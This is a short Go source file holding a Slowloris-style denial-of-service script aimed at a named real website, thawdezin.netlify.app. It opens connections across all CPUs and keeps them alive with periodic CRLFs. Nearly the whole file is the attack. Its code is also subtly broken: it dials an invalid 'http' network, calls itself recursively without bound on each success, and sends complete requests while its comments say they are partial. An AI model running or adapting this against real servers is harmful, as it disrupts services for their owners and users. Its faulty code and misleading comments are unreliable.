package main

import (
	"fmt"
	"net"
	"runtime"
	"time"
)

func slow2() {
	// targetHost is the hostname or IP address of the web server you want to attack
	targetHost := "thawdezin.netlify.app"

	// Interval between sending partial HTTP requests
	interval := time.Second

	// Get the maximum number of CPUs that can be executing simultaneously
	maxProcs := runtime.GOMAXPROCS(0)

	// Start a goroutine for each CPU to send partial HTTP requests to the server
	for i := 0; i < maxProcs; i++ {
		go func() {
			// Set up a connection to the target host
			conn, err := net.Dial("http", targetHost+":443")
			if err != nil {
				fmt.Println(err)
				return
			} else {
				print("OK\n")
				slow2()
			}
			defer conn.Close()

			// Send partial HTTP request headers to the server
			// Keep-Alive is used to keep the connection open
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: "+targetHost+"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\nConnection: keep-alive\r\n\r\n")

			// Start a goroutine to send partial HTTP requests every interval
			go func() {
				for {
					time.Sleep(interval)
					fmt.Fprintf(conn, "\r\n")
				}
			}()
		}()
	}

	// Sleep indefinitely to keep the program running
	for {
		time.Sleep(time.Hour)
	}
}
